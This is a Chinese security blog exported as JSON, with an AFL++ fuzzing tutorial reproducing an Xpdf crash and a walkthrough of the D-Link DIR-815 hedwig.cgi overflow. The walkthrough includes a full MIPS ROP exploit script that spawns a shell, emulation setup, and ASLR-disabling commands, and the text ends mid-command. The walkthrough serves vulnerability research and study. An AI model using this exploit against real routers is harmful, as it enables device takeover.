{"meta":{"title":"1ens's blog","subtitle":"","description":"a","author":"1ens","url":"http://example.com"},"pages":[{"title":"","date":"2022-05-24T15:09:56.842Z","updated":"2022-05-24T15:09:56.842Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2022-05-25T03:46:23.885Z","updated":"2022-05-25T03:46:23.885Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个菜鸡逆向选手"},{"title":"我的朋友们","date":"2022-05-24T15:06:34.544Z","updated":"2022-05-24T15:06:34.544Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"big lao","text":"big lao 带带"},{"title":"","date":"2022-05-24T15:03:31.990Z","updated":"2022-05-24T15:03:31.990Z","comments":true,"path":"mylist/index.html","permalink":"http://example.com/mylist/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2022-05-24T15:02:08.935Z","updated":"2022-05-24T15:02:08.935Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2022-05-24T15:02:51.734Z","updated":"2022-05-24T15:02:51.734Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"fuzz_0","slug":"fuzz-0","date":"2022-08-29T16:00:00.000Z","updated":"2022-08-30T13:32:16.995Z","comments":true,"path":"2022/08/30/fuzz-0/","link":"","permalink":"http://example.com/2022/08/30/fuzz-0/","excerpt":"","text":"fuzz初试（AFL++）简介：模糊测试（Fuzzing&#x2F;Fuzz）是一种自动化软件测试技术，它基于为程序提供随机或变异的输入值并监视它的异常和崩溃。 AFL 是一个覆盖引导的模糊器（coverage-guided fuzzer），这意味着它收集每个变异输入的覆盖信息，来发现新的执行路径和潜在的错误。当源代码可用时，AFL 可以使用插桩（instrumentation），在每个基本块（函数、循环等）的开头插入函数调用。 AFL++使用qemu用户模式模拟仿真来运行二进制文件，其使用的qemu是进行修改的版本，在程序执行时检测基本块，根据收集的信息生成测试用例，通过生成的大量测试用例触发不同的代码路径，从而提高代码的覆盖率，提高触发Crash的概率。 AFL的一些基础 AFL对开源代码进行fuzzing的过程可以用以下五步描述： 从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage） #AFL的覆盖率，计算在一次运行中，相应边执行的次数，次数单位为2的幂（以缓解路径爆炸）。如果一个用例输入发现了至少一条边，也就是创建一个新的桶来装入新的边的次数，那么这个用例就是interesting用例，并放入队列。AFL用一个bitmap把这些装有边次数的桶整合起来，一个byte代表一条边 选择一些输入文件，作为初始测试集加入输入队列（queue） 将队列中的文件按一定的策略进行 “突变” 如果经过变异文件更新了覆盖范围，则将其保留添加到队列中 上述过程会一直循环进行，期间触发了crash的文件会被记录下来 其大致思路是，对输入的seed文件不断地变化，并将这些mutated input喂给target执行，检查是否会造成崩溃。因此，fuzzing涉及到大量的fork和执行target的过程。也就是说，父进程fork出一个子进程执行输入用例，父进程等待结果。这样可以避免频繁调用execve（）函数。但是，fork也会有性能瓶颈的问题，AFL提出persistent mode，该模式下不会为每个测试用例fork。 取而代之的是，可以将循环的方式添加到目标程序中，也就是每次迭代执行一个测试用例。 AFL++变异器（对测试输入进行一些操作自定义变异器允许相关的模糊测试的研究在 AFL++ 之上构建新的调度算法、变异算法等等，而无需像当前许多工具那样fork 和修补 AFL。插件可以用 C ABI 兼容的语言编写，甚至可以用 Python 进行原型设计。例如，使用当前的 API，AFLSMART 可以作为 AFL++ 插件完全重写十次。目前AFL++实现了以下功能： afl_custom_(de)init ：初始化AFL++的伪随机数种子生成器 afl_custom_queue_get：其是一个回调函数，用于确定自定义的FUZZer是否应该FUZZ当前队列的用例。 afl_custom_fuzz：对给定的输入执行自定义变异。 afl_custom_havoc_mutation：对给定的输入执行单个自定义变异。 这种突变与AFL的havoc阶段的其他变异策略叠加在一起。 afl_custom_post_process：在某些情况下，从自定义 mutator 返回的变异数据的格式不适合作为输入到目标程序执行。例如，当使用 libprotobuf-mutator 时，返回的数据是对应于给定语法的 protobuf 格式，首先需要将其转换为目标的纯文本格式。 在这种情况下，或者要修复校验和以及大小，用户可以定义 afl_custom_post_process 函数。 afl_custom_queue_new_entry：在将新测试用例添加到队列后调用，这是一个存储元数据的API。 支持用例修剪的API 修剪用例的目的是减少因为大量产生用例导致格式过于复杂，以至于不符合协议格式。 afl_custom_init_trim：该API在每次修剪操作开始时被调用并接收初始缓冲区。它返回此次输入上可能的迭代次数（例如，如果输入有 n 个元素，其中一个应该被删除，则返回 n-1）。 如果实现的修剪算法不允许确定（剩余）步骤的数量，那么它可以返回 1 表示可以执行进一步的修剪，这将在 afl_custom_post_trim 返回 0 时执行。 afl_custom_trim：每次修剪操作都会调用 afl_custom_trim。 它可以记住当前状态，因此可以保存每次迭代的重新分析的步骤。该API返回修剪后的输入缓冲区，其返回的数据长度不得超过初始输入数据。 afl_custom_post_trim：该API在每次修剪操作后调用以通知修剪步骤是否成功。 插桩1 LLVMLLVM主要包含以下两种插桩方式：上下文敏感的边缘覆盖：edge覆盖是将每个block被分配的ID与被调用者的唯一ID进行异或运算。Ngram：在记录edge时不考虑前一个块和目标块，而是考虑目标块和前 N-1 个块，其中 N 是 2 到 16 之间的数字。 2 GCC除了包含旧的 afl-gcc 包装器，AFL++ 还附带了一个 GCC 插件。 它包括对延迟初始化和persistent 模式的支持，例如 AFL LLVM 模式。 3 QEMU该模式针对二进制程序进行模糊测试。 CVE-2019-13288 in XPDF 3.02实验环境配置虚拟机Ubuntu 20.04.2 LTS 镜像。用户名为 fuzz &#x2F; fuzz。 下载并构建首先为Fuzz目标创建一个新目录： 12cd $HOMEmkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/ 可能需要安装一些额外的工具（即 make 和 gcc） 1sudo apt install build-essential 下载 Xpdf 3.02： 12wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gztar -xvzf xpdf-3.02.tar.gz 构建 Xpdf： 12345cd xpdf-3.02sudo apt update &amp;&amp; sudo apt install -y build-essential gcc./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;makemake install 现在可以开始测试Xpdf。首先，需要下载一些 PDF 示例： 12345cd $HOME/fuzzing_xpdfmkdir pdf_examples &amp;&amp; cd pdf_exampleswget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdfwget http://www.africau.edu/images/default/sample.pdfwget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf 可以使用以下命令测试 pdfinfo 二进制文件： 1$HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf 安装AFLplusplus安装依赖： 1234sudo apt-get updatesudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptoolssudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\\..*//&#x27;)-dev 构建 AFL++： 12345cd $HOMEgit clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplusexport LLVM_CONFIG=&quot;llvm-config-11&quot;make distribsudo make install 输入afl-fuzz如下即为成功 使用AFL++开始Fuzz当源代码可用时，AFL 可以使用检测，在每个基本块（函数、循环等）的开头插入函数调用。为了为目标应用程序启用检测，所以需要使用 AFL 的编译器编译代码。简单来说就是需要使用afl编译器来编译目标。 首先，清理所有以前编译的目标文件和可执行文件： 123rm -r $HOME/fuzzing_xpdf/installcd $HOME/fuzzing_xpdf/xpdf-3.02/make clean 现在将使用afl-clang-fast编译器构建 xpdf 1234export LLVM_CONFIG=&quot;llvm-config-11&quot;CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;makemake install 现在可以使用以下命令运行Fuzz： 1afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output 执行参数说明： -i：表示输入文件目录 -o：表示 AFL++ 将存储变异文件的目录 -s：表示要使用的静态随机种子（AFL 使用非确定性测试算法，因此两个Fuzz会话永远不会相同。这就是为什么设置固定种子 -s 123的原因。用以保证Fuzz结果和示例相同。） @@：是占位符目标的命令行，AFL 将用每个输入文件名替换它 如果收到「Hmm, your system is configured to send core dump notifications to an external utility…」类似的命令，执行以下操作关闭核心转储： 123sudo suecho core &gt;/proc/sys/kernel/core_patternexit 可以看到红色的uniq crashes值，显示找到的唯一崩溃的数量。可以在$HOME/fuzzing_xpdf/out/default/crashes目录中找到这些崩溃文件。一旦发现第一个崩溃，就可以使用control+c停止 fuzzer。 什么时候可以停止fuzzer?其中一个指标可以参考cycles done 的数字颜色，依次会出现洋葱红色，黄色，蓝色，绿色，变成绿色时就很难产生新的crash文件了。 将此文件作为输入传递给 pdftotext 二进制文件（如果提示无法打开文件，将文件名称改为xxx.pdf再尝试） 1$HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/crash.pdf $HOME/fuzzing_xpdf/output 使用 gdb 找出程序因该输入而崩溃的原因 首先，需要使用调试信息重建 Xpdf 以获得符号堆栈跟踪： 123456rm -r $HOME/fuzzing_xpdf/installcd $HOME/fuzzing_xpdf/xpdf-3.02/make cleanCFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;makemake install 现在，可以运行 GDB： 1gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/crash.pdf $HOME/fuzzing_xpdf/output 然后，在 GDB 中输入： 1run 如果一切顺利，应该会看到以下输出： 然后输入bt以获取栈回溯：bt 报错信息Program received signal SIGSEGV, Segmentation fault，存在内存泄漏 报错位置 _int_malloc (av=av@entry=0x7ffff7c63b80 &lt;main_arena&gt;, bytes=bytes@entry=7) at malloc.c:1210，glibc报了个错，显然是堆内存出了问题 执行流信息，分析一下可以看出调用过程是循环的，判断为无限循环漏洞 根据函数调用找到漏洞位置 漏洞修复下个xpdf4.02源码对比一下就好，修复方式比较简单，加了个变量，记录循环次数，超过一定次数就结束进程。 参考： [原创]AFL速通——流程及afl-fuzz.c源码简析-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com AFL++ (PlusPlus) 介绍与实践 - WelkinChan - 博客园 (cnblogs.com) 模糊测试之AFL总结 (myfzy.top) AFL(American Fuzzy Lop)实现细节与文件变异 (seebug.org)","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"http://example.com/tags/fuzz/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"D-LINK DIR-815多次溢出漏洞","slug":"D-LINK DIR-815多次溢出漏洞","date":"2022-08-24T16:00:00.000Z","updated":"2022-08-25T12:34:11.093Z","comments":true,"path":"2022/08/25/D-LINK DIR-815多次溢出漏洞/","link":"","permalink":"http://example.com/2022/08/25/D-LINK%20DIR-815%E5%A4%9A%E6%AC%A1%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"准备 参考：[原创]家用路由器漏洞挖掘实例分析[图解D-LINK DIR-815多次溢出漏洞]-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com 该漏洞的描述位于这里，可知漏洞出现在hedwig.cgi文件中，漏洞产生的原因是Cookie的值超长造成缓冲区溢出。首先了解一下cgi文件。 cgi(Common Gateway Interface)，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。 固件下载地址 http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP binwalk解压固件 查看bin&#x2F;busybox得知是MIPS32，小端： 寻找线索find . -name &#39;*cgi&#39;查找文件 并ls -l ./htdocs/web/hedwig.cgi发现hedwig.cgi是指向.&#x2F;htdocs&#x2F;cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。 静态分析IDA静态调试cgibin文件，hedwigcgi_main函数处理整个过程，由于是HTTP_COOK这个字段引起的漏洞溢出点，可以在IDA（SHIFT+F12）搜索字符串，然后通过X，交叉引用来跟踪到hedwigcgi_main函数条用的位置。 跟踪到主函数的位置hedwigcgi_main，对函数功能进行大致分析，可以定位到其中的sprintf函数引起了栈溢出。调用sess_get_uid，得到HTTP_COOKIE的值。同样创建两个指针数组a1,a2，以等号为界将前半部分存入a1偏移为5处，后半部分存入a2偏移为5处，a1[5]为uid则将a2[5]存入参数指针数组的偏移为5处。函数sobj_get_string获得该数组中指向cookie的指针。 IDA动态调试-确定偏移位置程序通过 getenv 的方式获取 HTTP 数据包中的数据，流程应该为： 1234主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据#POST具体数据可以通过类似输入流传入 ：echo &quot;uid=aaa&quot;| /htdocs/web/hedwig.cgi 测试脚本test.sh 12345678910111213#!/bin/bash#注意：里面=和变量之间一定不要有空格，坑，否则读入空数据。test=$(python -c &quot;print (&#x27;uid=&#x27;+open(&#x27;content&#x27;,&#x27;r&#x27;).read(2000))&quot;) #方式一，以文件形式读入内容，提前填充好构造的数据到content文件#test=$(python -c &quot;print &#x27;uid=&#x27; + &#x27;A&#x27;*0x600&quot; )#方式二，直接后面接数据内容#test=$(python -c &quot;print &#x27;uid=&#x27;+open(&#x27;exploit&#x27;,&#x27;r&#x27;).read()&quot;)#test =$(python -c &quot;print &#x27;uid=&#x27; + &#x27;A&#x27;*1043 + &#x27;B&#x27;*4&quot;)#可选构造数据 LEN=$(echo -n &quot;$test&quot; | wc -c) PORT=&quot;1234&quot;cp $(which qemu-mipsel-static) ./qemusudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$test -E REQUEST_URL=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $PORT /htdocs/web/hedwig.cgi 2&gt;/dev/null #-E参数：加入环境变量 ；2&gt;/dev/null ：不输出提示错误rm -f ./qemu 利用patternLocOffset.py生成content文件，包含特定格式的2000个字符串。类似于cyclic 1python patternLocOffset.py -c -l 2000 -f content 在0x0409A38处断下 python patternLocOffset.py -s 0x38694237 -l 2000计算偏移： 跟完sess_get_uid()函数可发现后面还有一个sprintf()，这里也会造成栈溢出，哪到底哪个才是真正的利用点呢 从整个函数可以看出，fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;)的成功与否会导致程序走向这两个地方，即成功后是第二个sprintf()为溢出利用点，而失败时是第一个sprintf()为溢出利用点 如果 fopen(&quot;/var/tmp/temp.xml&quot;, &quot;w&quot;) 打开成功则会执行到第二个 sprintf，因为没有实机没法判断实际固件中是否有这个目录 因此我们手动创建该目录及文件 12mkdir var/tmptouch var/tmp/temp.xml 这里假设第二个sprintf()为漏洞点（其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造 rop 链方法都是一样的），所以偏移得重新计算 但是haystack为0的话无法走到第二个sprintf 交叉引用找到这 动调可知在sub_402B40函数，这里影响着haystack的赋值 这部分前面的代码，可知随便传点参数即可 参考D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern’s 小站 1234567891011#!/bin/bash# test2.shINPUT=&quot;x=x&quot;COOKIE=$(python -c &quot;print(&#x27;uid=&#x27; + open(&#x27;context&#x27;,&#x27;r&#x27;).read())&quot;)PORT=&quot;1234&quot;LEN=$(echo -n &quot;$INPUT&quot; | wc -c)cp $(which qemu-mipsel-static) ./qemuecho $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;127.0.0.1&quot; -g $PORT /htdocs/web/hedwig.cgirm -f ./qemu 最终的偏移为1009. ROP 链的构造gdb-multiarch+QEMU动态调试分析验证1，通过gdb指定脚本调试（避免重复输入，重复造轮子浪费时间） 123456set architecture mipsset endian littletarget remote :1234b *0x409a54cvmmap 执行 #一定要加载文件htdocs&#x2F;cgibin不然vmmap得不到结果 1gdb-multiarch htdocs/cgibin -x dbgscript -x是指定要执行的命令文件 but…还是每找到完整的vmmap 但实际上，我们查看 lib 目录下的 libc.so.0 即可知 找到systeam的地址 另外一种方法 12345678from pwn import *context.arch = &quot;mips&quot;context.endian = &quot;little&quot;libc = ELF(&quot;./lib/libuClibc-0.9.30.1.so&quot;)libc.address = 0x77fe2000 # base address rop链的基地址，确定方法在后面system_addr = libc.symbols[&#x27;system&#x27;]log.success(&quot;system address: 0x%x&quot; % system_addr) 得到 system address: 0x7f78b200 然后便是找一个能将 system() 首个参数写入 $a0 的 gadget，这里在 libuClibc-0.9.30.1.so 中使用 mipsrop 插件，利用 mipsrop.stackfinder() 命令找将栈上数据放入寄存器的 gadget： 打开 mips rop gadgets 然后命令行输入mipsrop.stackfinders() 选择0x159cc的指令。该指令序列首先将SP+0x10（动调）地址存入寄存器S5中，而在偏移0x159EO处将$S5作为参数存入 Sa0，也就是说，这里需要将第一步得到的system地址填充到$So中，然后在$SP+0x10处填充需要执行的命令，即可实现对system(“”command”)函数的调用。 因为 system地址的最低位为0x00，而在 hedwig_main获取Cookie的过程中，也没有对这部分数据进行解码，所以，试图通过访问 hedwig.cgi时对Cookie进行编码来避开0x00是不可能的，这就使 sprintf函数可能被截断，造成缓冲区溢出失败。为了避开 0x00，写入时- 1 ，后面再找一个 gadget 加一即可 hedwigcgi_main() 结尾部分： 修改 12345678910$s0$s1$s2$s3$s4$s5$s6$s7$fp$ra &lt;== 返回地址 ROP的思路 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *from MIPSPayload import MIPSPayloadimport string, random, sysclass MIPSPayload: BADBYTES = b&quot;\\x00&quot; LITTLE = &quot;little&quot; BIG = &quot;big&quot; FILLER = b&quot;A&quot; BYTES = 4 def __init__(self, elfbase:int, endian:str = LITTLE, badbytes: bytes = BADBYTES): self.elfbase = elfbase self.badbytes = badbytes self.endian = endian self.payload = bytes() def rand_text(self, size): table = (string.ascii_letters + string.digits).encode() return bytes(random.choices(table, k=size)) def Add(self, data): if type(data) is bytes: self.payload += data else: raise TypeError(&quot;%s is no support type&quot; % type(data)) def Address(self, offset, base=None): if base is None: base = self.elfbase return self.ToBytes(base + offset) def AddAddress(self, offset, base=None): self.Add(self.Address(offset, base)) def ToBytes(self, value, size=BYTES): data = [(value &gt;&gt; (8 * i)) &amp; 0xff for i in range(size)] if self.endian != self.LITTLE: data = data[::-1] return bytes(data) def AddNOPs(self, size): self.Add(self.rand_text(size)) def AddBuffer(self, size, byte=FILLER): self.Add(byte * size) def Build(self): count = 0 for c in self.payload: if self.badbytes.find(c) != -1: raise ValueError(&quot;Bad byte found in payload at offset %d: 0x%.2X&quot; % (count, c)) count += 1 return self.payload def Print(self, bpl = BYTES): i = 0 for c in self.payload: if i == 4: print() i = 0 sys.stdout.write(&quot;\\\\x%.2X&quot; % c) sys.stdout.flush() if bpl &gt; 0: i += 1 print(&quot;\\n&quot;)context.arch = &quot;mips&quot;context.endian = &quot;little&quot;context.log_level = &quot;debug&quot;payload = MIPSPayload(0x7f738000)libc = ELF(&quot;./lib/libuClibc-0.9.30.1.so&quot;)libc.address = 0x77fe2000system_addr = libc.symbols[&#x27;system&#x27;]log.success(&quot;system address: 0x%x&quot; % system_addr)calcsystem = 0x158c8 # $s0 add 1, jalr $s5callsystem = 0x159cc # cmd -&gt; $a0, jalr $s0 (system_addr)payload.AddBuffer(0x3CD) # 973payload.AddAddress(system_addr - 1) # $s0 977payload.AddBuffer(4) # $s1 981payload.AddBuffer(4) # $s2 985payload.AddBuffer(4) # $s3 989payload.AddBuffer(4) # $s4 993 payload.AddAddress(callsystem) # $s5 997payload.AddBuffer(4) # $s6 1001payload.AddBuffer(4) # $s7 1005payload.AddBuffer(4) # $fp 1009payload.AddAddress(calcsystem) # $rapayload.AddBuffer(0x10) # .text:000159CC addiu $s5, $sp, 0x170+var_160payload.Add(b&#x27;//bin/sh&#x27;)f = open(&quot;exploit&quot;, &#x27;wb+&#x27;)f.write(payload.Build())f.close() qemu系统模式这里主要是为了在qemu虚拟机中重现http服务。 /sbin/httpd应该是用于监听web端口的http服务，同时查看/htdocs/web文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。 find ./ -name &#39;*http*&#39;找到web配置文件httpcfg.php 查看内容后分析出httpcfg.php文件的作用是生成供所需服务的配置文件的内容，所以我们参照里面内容，自己创建一个conf作为生成的配置文件，填充我们所需的内容。（留个坑，暂时没搞懂） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576Umask 026PIDFile /var/run/httpd.pidLogGMT On #开启logErrorLog /log #log文件 Tuning&#123; NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60&#125; Control&#123; Types &#123; text/html &#123; html htm &#125; text/xml &#123; xml &#125; text/plain &#123; txt &#125; image/gif &#123; gif &#125; image/jpeg &#123; jpg &#125; text/css &#123; css &#125; application/octet-stream &#123; * &#125; &#125; Specials &#123; Dump &#123; /dump &#125; CGI &#123; cgi &#125; Imagemap &#123; map &#125; Redirect &#123; url &#125; &#125; External &#123; /usr/sbin/phpcgi &#123; php &#125; &#125;&#125; Server&#123; ServerName &quot;Linux, HTTP/1.1, &quot; ServerId &quot;1234&quot; Family inet Interface eth0 #对应qemu仿真路由器系统的网卡 Address 192.168.40.138 #qemu仿真路由器系统的IP Port &quot;1234&quot; #对应未被使用的端口 Virtual &#123; AnyHost Control &#123; Alias / Location /htdocs/web IndexNames &#123; index.php &#125; External &#123; /usr/sbin/phpcgi &#123; router_info.xml &#125; /usr/sbin/phpcgi &#123; post_login.xml &#125; &#125; &#125; Control &#123; Alias /HNAP1 Location /htdocs/HNAP1 External &#123; /usr/sbin/hnap &#123; hnap &#125; &#125; IndexNames &#123; index.hnap &#125; &#125; &#125;&#125; 使用qemu-system-mipsel从系统角度进行模拟，就需要一个mips架构的内核镜像和文件系统。可以在如下网站下载：Index of &#x2F;~aurel32&#x2F;qemu 因为是小端，这里直接选择mipsel，然后下载其中两个文件： debian_squeeze_mipsel_standard.qcow2是文件系统，vmlinux-3.2.0-4-4kc-malta是内核镜像 启动脚本start.sh 12345678sudo qemu-system-mipsel \\-M malta \\-kernel vmlinux-3.2.0-4-4kc-malta \\-hda debian_squeeze_mipsel_standard.qcow2 \\-append &quot;root=/dev/sda1 console=tty0&quot; \\-net nic \\-net tap \\-nographic \\ 输入用户名&#x2F;密码 root&#x2F;root或user&#x2F;user即可登录qemu模拟的系统 接下来在宿主机创建一个网卡，使qemu内能和宿主机通信。 安装依赖库： 1sudo apt-get install bridge-utils uml-utilities 在宿主机编写如下文件保存为net.sh并运行： 1234567891011121314sudo sysctl -w net.ipv4.ip_forward=1sudo iptables -Fsudo iptables -Xsudo iptables -t nat -Fsudo iptables -t nat -Xsudo iptables -t mangle -Fsudo iptables -t mangle -Xsudo iptables -P INPUT ACCEPTsudo iptables -P FORWARD ACCEPTsudo iptables -P OUTPUT ACCEPTsudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADEsudo iptables -I FORWARD 1 -i tap0 -j ACCEPTsudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPTsudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0 然后配置qemu虚拟系统的路由，在qemu虚拟系统中编写net.sh并运行： 123#！/bin/sh ifconfig eth0 192.168.100.2 netmask 255.255.255.0route add default gw 192.168.100.254 eth0的网卡是192.168.100.2并且可以和宿主机ping通表示成功 随后使用scp命令将binwalk解压出来的squashfs-root文件夹上传到qemu系统中的**&#x2F;root**路径下： 1scp -r squashfs-root/ root@192.168.100.2:/root 然后在qemu虚拟系统中将squashfs-root文件夹下的库文件替换掉原有的，此操作会改变文件系统，如果不小心退出了虚拟系统，再次启动qemu时会失败，原因是因为改变了文件系统的内容。此时需要使用新的文件系统，因此在此操作之前可以先备份一份。编写auto.sh并执行： 123456789101112131415cp sbin/httpd /cp -rf htdocs/ /rm -rf /etc/servicescp -rf etc/ /cp lib/ld-uClibc-0.9.30.1.so /lib/cp lib/libcrypt-0.9.30.1.so /lib/cp lib/libc.so.0 /lib/cp lib/libgcc_s.so.1 /lib/cp lib/ld-uClibc.so.0 /lib/cp lib/libcrypt.so.0 /lib/cp lib/libgcc_s.so /lib/cp lib/libuClibc-0.9.30.1.so /lib/cd /ln -s /htdocs/cgibin /htdocs/web/hedwig.cgiln -s /htdocs/cgibin /usr/sbin/phpcgi 接下来在qemu虚拟系统的根目录（ &#x2F; ）下，创建一个名为conf的文件，此文件是httpd服务的配置文件。内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172Umask 026PIDFile /var/run/httpd.pidLogGMT On #开启logErrorLog /log #log文件Tuning&#123; NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60&#125;Control&#123; Types &#123; text/html &#123; html htm &#125; text/xml &#123; xml &#125; text/plain &#123; txt &#125; image/gif &#123; gif &#125; image/jpeg &#123; jpg &#125; text/css &#123; css &#125; application/octet-stream &#123; * &#125; &#125; Specials &#123; Dump &#123; /dump &#125; CGI &#123; cgi &#125; Imagemap &#123; map &#125; Redirect &#123; url &#125; &#125; External &#123; /usr/sbin/phpcgi &#123; php &#125; &#125;&#125;Server&#123; ServerName &quot;Linux, HTTP/1.1, &quot; ServerId &quot;1234&quot; Family inet Interface eth0 #网卡 Address 192.168.100.2 #qemu的ip地址 Port &quot;4321&quot; #对应web访问端口 Virtual &#123; AnyHost Control &#123; Alias / Location /htdocs/web IndexNames &#123; index.php &#125; External &#123; /usr/sbin/phpcgi &#123; router_info.xml &#125; /usr/sbin/phpcgi &#123; post_login.xml &#125; &#125; &#125; Control &#123; Alias /HNAP1 Location /htdocs/HNAP1 External &#123; /usr/sbin/hnap &#123; hnap &#125; &#125; IndexNames &#123; index.hnap &#125; &#125; &#125;&#125; 最后启动httpd服务： 1./httpd -f conf 这里访问失败是因为hedwig.cgi服务没有收到请求，需要提前配置qemu虚拟环境中的REQUEST_METHOD等方法，因为httpd是读取的环境变量，这里就直接通过环境变量进行设置： 12345export CONTENT_LENGTH=&quot;100&quot;export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;export REQUEST_METHOD=&quot;POST&quot;export REQUEST_URI=&quot;/hedwig.cgi&quot;export HTTP_COOKIE=&quot;uid=1234&quot; 这里在qemu虚拟系统中运行hedwig.cgi，再次访问http://192.168.100.2:4321/hedwig.cgi就可以正常收到内容了 接下来就是使用gdbserver对hedwig.cgi进行调试了。 gdbserver调试动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化 1echo 0 &gt; /proc/sys/kernel/randomize_va_space 注：正常路由环境和 MIPS 虚拟机中为了程序运行速度会取消 canary，地址随机化等保护机制 这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的 gdbserver auto.shell 1234567#!/bin/bashexport CONTENT_LENGTH=&quot;100&quot;export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;export HTTP_COOKIE=&quot;uid=`cat content`&quot; #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建export REQUEST_METHOD=&quot;POST&quot;export REQUEST_URI=&quot;/hedwig.cgi&quot;echo &quot;uid=1234&quot;|./gdbserver 192.168.100.254:8888 /htdocs/web/hedwig.cgi #IP为宿主机IP 宿主机连接 gdbserver 123gdb-multiarch htdocs/cgibinset architecture mipstarget remote 192.168.100.2:8888 #对应qemu地址和端口 这里我们终于可以看到vmmap 接下来是确定libc的基地址，需要先把环境变量配置好，不然&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。 利用（注意根据会先pid规律，快速修改预测pid执行，否则maps地址数据不会出来） 1/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps a&amp;b 先执行a，在执行b，无论a成功与否都会执行b。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。 123456789101112131415161718192021222324252627export CONTENT_LENGTH=&quot;100&quot;root@debian-mipsel:~# export CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot;root@debian-mipsel:~# export HTTP_COOKIE=&quot;uid=1234&quot;root@debian-mipsel:~# export REQUEST_METHOD=&quot;POST&quot;root@debian-mipsel:~# export 